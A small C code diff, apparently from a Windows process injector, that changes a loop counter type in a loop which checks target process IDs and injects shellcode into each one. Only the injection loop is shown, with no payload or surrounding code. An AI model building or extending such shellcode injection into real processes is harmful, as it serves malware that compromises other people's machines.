@@ -162,7 +162,7 @@ int main() {
     CreateThread(0, 0, free_pids, &a, 0, 0);
 
     while (true) {
-        for (int i=0; i<MAX_TARGETS; i++) {
+        for (size_t i=0; i<MAX_TARGETS; i++) {
             if (check_pid(&a, a.pids[i])) {
                 inject(shellcode, sizeof(shellcode), a.pids[i]);
                 add_pid(&a, a.pids[i]);
